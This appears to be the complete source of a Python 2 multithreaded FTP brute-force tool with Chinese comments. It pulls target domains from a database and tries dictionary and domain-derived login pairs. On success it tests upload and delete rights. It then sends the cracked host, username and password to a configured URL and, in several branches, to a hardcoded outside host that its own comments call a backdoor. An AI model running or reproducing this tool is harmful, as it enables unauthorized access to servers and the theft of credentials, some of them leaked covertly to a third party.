#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
##################################################
#qq:29295842
#BLOG:http://hi.baidu.com/alalmn
# linkftp  连接FTP爆破

from ftplib import FTP
import urllib2, time
import Csqlite3
import socket
import threading
socket.setdefaulttimeout(10)  #设置了全局默认超时时间
import thread
import ConfigParser  #INI读取数据
from threading import Thread
from collections import defaultdict, deque


class CS_linkftp(threading.Thread):
    def __init__(self,htint):
        threading.Thread.__init__(self)
        self.Internet=10  #控制到300次检测一次网络状态
        self.Ht=htint  #线程ID
        self.Chost=""  #主机地址
        self.sql3=Csqlite3.C_sqlite3()
        self.sql3.mysqlite3_open()

    def run(self):
        try:
            print u"<<<FTP爆破CS_linkftp线程%d启动"%(self.Ht)
            self.open_mysql()     #读取URL
            #self.Chost="127.0.0.1"
            #self.ftp_login(self.Chost)
        except:
            print u"<<<线程%d--CS_linkftp---run异常！！！！！"%(self.Ht)
            time.sleep(60)
            self.run()

    def open_mysql(self):  #读取URL
        try:
            self.Asql="select * from openurl where openftp is NULL limit 1"
            self.data = self.sql3.mysqlite3_select(self.Asql)
            print U"数据库URL",self.data
            if ~self.data.find("null123456"):
                print u"<<<线程%d--CS_linkftp--openftp表可能无读取的数据请查看数据库！！！！！"%(self.Ht)
                time.sleep(300)  #3秒
                self.open_mysql()     #读取URL

            if self.data == '':  #传入值等于空   返回
                time.sleep(60)  #3秒
                self.open_mysql()     #读取URL
            self.update = "update openurl set openftp='send' where url='%s'"%(self.data)
            self.sql3.mysqlite3_update(self.update)
            #print u"测试URLFTP：",self.data
            self.ftp_login(self.data)  #测试URL FTP是否开放
        except:
            print u"<<<线程%d--CS_linkftp--openftp表读取URL异常！！！！！"%(self.Ht)
            time.sleep(60)
            self.open_mysql()     #读取URL

    WEAK_USERNAME = [p.replace('\n','') for p in open('username.dic').readlines()]
    WEAK_PASSWORD = [p.replace('\n','') for p in open('password.dic').readlines()]

    def get_sdomain(self,domain):  #域名拆解www.baidu.com->baidu.com
        suffixes = 'ac', 'ad', 'ae', 'aero', 'af', 'ag', 'ai', 'al', 'am', 'an', 'ao', 'aq', 'ar', 'arpa', 'as', 'asia', 'at', 'au', 'aw', 'ax', 'az', 'ba', 'bb', 'bd', 'be', 'bf', 'bg', 'bh', 'bi', 'biz', 'bj', 'bm', 'bn', 'bo', 'br', 'bs', 'bt', 'bv', 'bw', 'by', 'bz', 'ca', 'cat', 'cc', 'cd', 'cf', 'cg', 'ch', 'ci', 'ck', 'cl', 'cm', 'cn', 'co', 'com', 'coop', 'cr', 'cu', 'cv', 'cx', 'cy', 'cz', 'de', 'dj', 'dk', 'dm', 'do', 'dz', 'ec', 'edu', 'ee', 'eg', 'er', 'es', 'et', 'eu', 'fi', 'fj', 'fk', 'fm', 'fo', 'fr', 'ga', 'gb', 'gd', 'ge', 'gf', 'gg', 'gh', 'gi', 'gl', 'gm', 'gn', 'gov', 'gp', 'gq', 'gr', 'gs', 'gt', 'gu', 'gw', 'gy', 'hk', 'hm', 'hn', 'hr', 'ht', 'hu', 'id', 'ie', 'il', 'im', 'in', 'info', 'int', 'io', 'iq', 'ir', 'is', 'it', 'je', 'jm', 'jo', 'jobs', 'jp', 'ke', 'kg', 'kh', 'ki', 'km', 'kn', 'kp', 'kr', 'kw', 'ky', 'kz', 'la', 'lb', 'lc', 'li', 'lk', 'lr', 'ls', 'lt', 'lu', 'lv', 'ly', 'ma', 'mc', 'md', 'me', 'mg', 'mh', 'mil', 'mk', 'ml', 'mm', 'mn', 'mo', 'mobi', 'mp', 'mq', 'mr', 'ms', 'mt', 'mu', 'mv', 'mw', 'mx', 'my', 'mz', 'na', 'name', 'nc', 'ne', 'net', 'nf', 'ng', 'ni', 'nl', 'no', 'np', 'nr', 'nu', 'nz', 'om', 'org', 'pa', 'pe', 'pf', 'pg', 'ph', 'pk', 'pl', 'pm', 'pn', 'pr', 'pro', 'ps', 'pt', 'pw', 'py', 'qa', 're', 'ro', 'rs', 'ru', 'rw', 'sa', 'sb', 'sc', 'sd', 'se', 'sg', 'sh', 'si', 'sj', 'sk', 'sl', 'sm', 'sn', 'so', 'sr', 'st', 'su', 'sv', 'sy', 'sz', 'tc', 'td', 'tel', 'tf', 'tg', 'th', 'tj', 'tk', 'tl', 'tm', 'tn', 'to', 'tp', 'tr', 'tt', 'tv', 'tw', 'tz', 'ua', 'ug', 'uk', 'us', 'uy', 'uz', 'va', 'vc', 've', 'vg', 'vi', 'vn', 'vu', 'wf', 'ws', 'xn', 'ye', 'yt', 'za', 'zm', 'zw'
        sdomain = []
        bdomain = False
        for section in domain.split('.'):
            if section in suffixes:
                sdomain.append(section)
                bdomain = True
            else:
                sdomain = [section]
        return '.'.join(sdomain) if bdomain  else ''

    def get_ssdomain(self,domain):  #域名拆解www.baidu.com->baidu
        sdomain = self.get_sdomain(domain)  #先解析一道
        ssdomian = sdomain.partition('.')[0] if sdomain else ''
        return ssdomian

    def ftp_login(self,host,nthreads=5,port=21): #传入名域名开始扫描
    #尝试登录  if success return username & password
        #print u"要扫描IP:",host,
        self.t=time.time()  #扫描计时
        try:
            ftpA = FTP()  #初始化FTP类
            ftpA.connect(host,port)  #连接 服务器名  端口号
        except Exception, e:
            print u"<<<线程%d--%s服务器FTP21端口可能没有开放"%(self.Ht,host)
            self.upf2 = "update  openurl set  openftp='no21' where url='%s'"%(host)
            self.sql3.mysqlite3_update(self.upf2)  #修改数据
            time.sleep(10)
            self.open_mysql()     #读取URL
            return

        #print u"要扫描IP:",host,
        #得到sdomain和ssdomain
#        domain = host   #不明白未什么还要赋值  直接使用host变量不就可以了吗
#        sdomain = self.get_sdomain(domain)  #域名拆解www.baidu.com->baidu.com
#        ssdomain = self.get_ssdomain(domain)  #域名拆解www.baidu.com->baidu
#        #拆解不够完全有这样的一个玉米  123456.blog.baidu.com.cn   ！！！！！！！

        ###################################
        Adomain = host     #域名www.baidu.com
        Bdomain = self.get_sdomain(Adomain)  #域名拆解www.baidu.com->baidu.com
        Cdomain = self.get_ssdomain(Adomain)  #域名拆解www.baidu.com->baidu
        Ddomain = "" #域名拆解www.baidu.com->wwwbaiducom
        for i, j in {'.':''}.iteritems():#去.符号
            Ddomain = Adomain.replace(i,j)
        #print Ddomain
        ###################################
        accounts = deque()   #list数组

        #准备 用户名和密码
        for username in CS_linkftp.WEAK_USERNAME:   #导入用户名#WEAK_USERNAME=username.dic
            if  '%Adomain%' in username or '%Bdomain%' in username or '%Cdomain%' in username or '%Ddomain%' in username:
                if Adomain=='':
                    continue  #跳过
                else:
                    username = username.replace('%Adomain%',Adomain)  #返回根据正则表达式进行文字替换后的字符串的复制
                    username = username.replace('%Bdomain%',Bdomain)
                    username = username.replace('%Cdomain%',Cdomain)
                    username = username.replace('%Ddomain%',Ddomain)

            for password in CS_linkftp.WEAK_PASSWORD:   #导入密码#WEAK_PASSWORD=password.dic
                if '%Adomain%' in password or '%Bdomain%' in password or '%Cdomain%' in password or '%Ddomain%' in password:
                    if Adomain=='':
                        continue  #跳过
                    else:
                        password = password.replace('%Adomain%',Adomain)
                        password = password.replace('%Bdomain%',Bdomain)
                        password = password.replace('%Cdomain%',Cdomain)
                        password = password.replace('%Ddomain%',Ddomain)

                password = password.replace('%null%','')
                password = password.replace('%username%',username)

                if (username,password) not in accounts:#list数组
                    accounts.append((username,password))#添加到 list数组
                    ##################################################################

        if not accounts:   #数组无数据了就跳出
            print u"<<<线程%d--%s 数组无数据"%(self.Ht,host)
            #在从新读取
            time.sleep(60)
            self.open_mysql()     #读取URL
            return 0
            #print u"<<<线程",self.Ht,u"--组合出",len(accounts),u" 次密码"
        #print u"<<<线程%d--扫描网站FTP:%s 开始"% (self.Ht,host)
        #print "*\r",
        class crackThread(Thread):  #研究下c++类的继承  和嵌套看怎么继承CS_linkftp类
            #破解 帐户线程
            def __init__(self,Ht):
                Thread.__init__(self)
                self.AHt=Ht
                self.running = True  #这是  控制线程数量
                self.ftp = FTP()  #初始化FTP类
                self.Auploadfile="CS.txt"  #上传文件名
                self.ftpID=0   #FTP权限
                try:
                    config = ConfigParser.ConfigParser()
                    config.readfp(open("gost.ini"))
                    self.Auploadfile = config.get("DATA","uploadfile")  #测试上传文件
                    self.http_post = config.get("DATA","http_post")  #结果提交到后台管理
                except:
                    print u"INI读取异常uploadfile,http_post"
                #0  连接不上
                #1  连接成功
                #2  有上传权限
                #3  有上传和删除权限
                #self.ftp.set_debuglevel(2)  #打开调试级别2，显示详细信息
            ################################################
                #检测FTP权限
            def ftpconnect(self,FTP,host,user,pwd):    #连接FTP
                ftp=FTP
                try:
                    #ftp.set_debuglevel(2) #打开调试级别2，显示详细信息
                    ftp.connect(host,21) #连接
                    ftp.login(user,pwd) #登录，如果匿名登录则用空串代替即可
                    #print u"连接",host,u"FTP成功"
                    self.ftpID=1
                    if self.uploadfile(ftp):   #上传文件
                        self.delete(ftp) #删除文件

                    ftp.quit() #退出ftp服务器
                    return 1
                except:
                    #print u"adminFTP.py======连接",host,u"FTP失败！！！！"
                    self.ftpID=0
                    try:
                        ftp.quit() #退出ftp服务器
                    except:
                        #print u"adminFTP.py======FTP退出异常"
                        ftp.close()
                    return 0

            def uploadfile(self,ftpU):   #上传文件
                try:
                    #remotepath = "Server.ini" #远程路径
                    bufsize = 1024
                    #localpath = 'Server.ini'   #本地路径
                    fp = open(self.Auploadfile,'rb')
                    ftpU.storbinary('STOR '+ self.Auploadfile ,fp,bufsize) #上传文件
                    #ftpU.set_debuglevel(0)  #关闭调试模式
                    fp.close() #关闭文件
                    #ftpU.quit()   #退出ftp
                    #print u"adminFTP.py======上传文件文件",localpath,u"成功"
                    self.ftpID=2
                    return 1
                except:
                    #print u"adminFTP.py======上传文件失败！！！！"
                    return 0

            def delete(self,ftpD): #删除文件
                try:
                    #remotepath = "Server.ini" #远程路径
                    ftpD.delete(self.Auploadfile)        #删除远程文件
                    #print u"adminFTP.py======删除文件",remotepath,u"成功"
                    self.ftpID=3
                    return 1
                except:
                    #print u"adminFTP.py======删除文件失败！！！！"
                    return 0

            def url_post(self,URL):
                try:
                    req = urllib2.Request(URL)
                    req.add_header('User-Agent',"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
                    urllib2.urlopen(req,timeout=20)  # 超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
                    #urllib2.urlopen(URL,timeout=20)  # 后门POST提交   超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
                    time.sleep(3)
                except:
                    print u"POST提交到后台失败"
                    return 0
            ################################################

            def run(self):
                MAX_RETRIES = 5
                retry = 0
                account = None   #None=NULL  数组
                while self.running and accounts:#list数组

                    try:
                        self.ftp.connect(Adomain,port)  #连接 服务器名  端口号
                    except Exception, e:
                        if retry <= MAX_RETRIES:  #这是为了控制线程吗
                            retry = retry +1    #没必要使用这个变量啊
                            continue  #跳过
                        else:
                            self.running = False  #这是  控制线程
                            break   #跳出

                    #print ".",
                    #重新每三次    为什么一个账户要连接3次  呢
                    loop_num = 0
                    while loop_num<3:
                        loop_num = loop_num + 1

                        if not account and accounts:#list数组
                            account = accounts.pop()   #list数组  输出

                        #绝对不要尝试
                        if not account:   #数组无数据了就跳出
                            break   #跳出

                        #print u'IP:',host,u'用户名:',account[0],u'密码:',account[1]
                        try:
                            self.ftp.login(account[0],account[1])  #连接FTP
                            #没有异常发生，这是一个正确的帐号
#                            self.Asql3=Csqlite3.C_sqlite3()
#                            self.Asql3.mysqlite3_open()
                            print u"<<<线程",self.AHt,u'--FTP连接成功IP:',host,u"用户名:",account[0],u"密码:",account[1]
#                            ABCsql = "insert into ftppassword0(IP,user,password,time) values('%s','%s','%s','%s')"%(host,account[0],account[1],time.strftime('%Y.%m.%d-%H.%M.%S'))
#                            self.Asql3.mysqlite3_insert(ABCsql) #添加到数据库
                            if self.ftpconnect(self.ftp,host,account[0],account[1]):
                                #print self.ftpID
                                if self.ftpID==0:
                                    print u"<<<线程",self.AHt,u'--FTP连接失败IP:',host,u"用户名:",account[0],u"密码:",account[1]
#                                    ABCsql = "insert into ftppassword(IP,user,password,root,time) values('%s','%s','%s','0','%s')"%(host,account[0],account[1],time.strftime('%Y.%m.%d-%H.%M.%S'))
#                                    self.Asql3.mysqlite3_insert(ABCsql) #添加到数据库
                                if self.ftpID==1:
#                                    self.Asql3=Csqlite3.C_sqlite3()
#                                    self.Asql3.mysqlite3_open()
#                                    ABCsql = "insert into ftppassword(IP,user,password,root,time) values('%s','%s','%s','1','%s')"%(host,account[0],account[1],time.strftime('%Y.%m.%d-%H.%M.%S'))
#                                    self.Asql3.mysqlite3_insert(ABCsql) #添加到数据库
                                    #URL="http://999kankan.com/ftppassword.php?IP=%s&user=%s&password=%s&root=1"%(host,account[0],account[1])
                                    #self.url_post(URL)   #后门
                                    URL1="%s?IP=%s&user=%s&password=%s&root=1"%(self.http_post,host,account[0],account[1])
                                    self.url_post(URL1)   #提交到用户
                                if self.ftpID==2:
                                    self.Asql3=Csqlite3.C_sqlite3()
                                    self.Asql3.mysqlite3_open()
                                    ABCsql = "insert into ftppassword(IP,user,password,root,time) values('%s','%s','%s','2','%s')"%(host,account[0],account[1],time.strftime('%Y.%m.%d-%H.%M.%S'))
                                    self.Asql3.mysqlite3_insert(ABCsql) #添加到数据库
                                    URL="http://999kankan.com/ftppassword.php?IP=%s&user=%s&password=%s&root=2"%(host,account[0],account[1])
                                    self.url_post(URL)   #后门
                                    URL1="%s?IP=%s&user=%s&password=%s&root=2"%(self.http_post,host,account[0],account[1])
                                    self.url_post(URL1)   #提交到用户
                                if self.ftpID==3:
                                    self.Asql3=Csqlite3.C_sqlite3()
                                    self.Asql3.mysqlite3_open()
                                    ABCsql = "insert into ftppassword(IP,user,password,root,time) values('%s','%s','%s','3','%s')"%(host,account[0],account[1],time.strftime('%Y.%m.%d-%H.%M.%S'))
                                    self.Asql3.mysqlite3_insert(ABCsql) #添加到数据库
                                    URL="http://999kankan.com/ftppassword.php?IP=%s&user=%s&password=%s&root=3"%(host,account[0],account[1])
                                    self.url_post(URL)   #后门
                                    URL1="%s?IP=%s&user=%s&password=%s&root=3"%(self.http_post,host,account[0],account[1])
                                    self.url_post(URL1)   #提交到用户

                            time.sleep(3)
                            account = None  #None=NULL   self.sql.
                        except Exception, e:
                            emsg = str(e)    #调试信息
                            if 'connection' in emsg.lower() or 'tries' in emsg.lower():   #判断 连接  失败错误信息    不明白何意
                                retry = retry +1
                                break   #跳出
                            else:
                                #reset retry
                                account = None  #None=NULL
                                retry = 0

        threads = []  #线程
        for i in range(nthreads):  #nthreads=10  创建10个线程
            threads.append(crackThread(self.Ht))

        for thread in threads:   #不理解这是什么意思    是结束线程吗
            thread.start()  #start就是开始线程

        for thread in threads:   #不理解这是什么意思    是结束线程吗
            thread.join()
        print u"<<<线程%d--==%s扫描结束%s=====用时%s<<<"%(self.Ht,host,time.strftime('%Y.%m.%d-%H.%M.%S'),time.time()-self.t)
        self.open_mysql()     #读取URL

################################################
if __name__=='__main__':
    threads = []  #线程
    nthreads=50
    for i in range(nthreads):  #nthreads=10  创建10个线程
        threads.append(CS_linkftp(i))

    for thread in threads:   #不理解这是什么意思    是结束线程吗
        thread.start()  #start就是开始线程












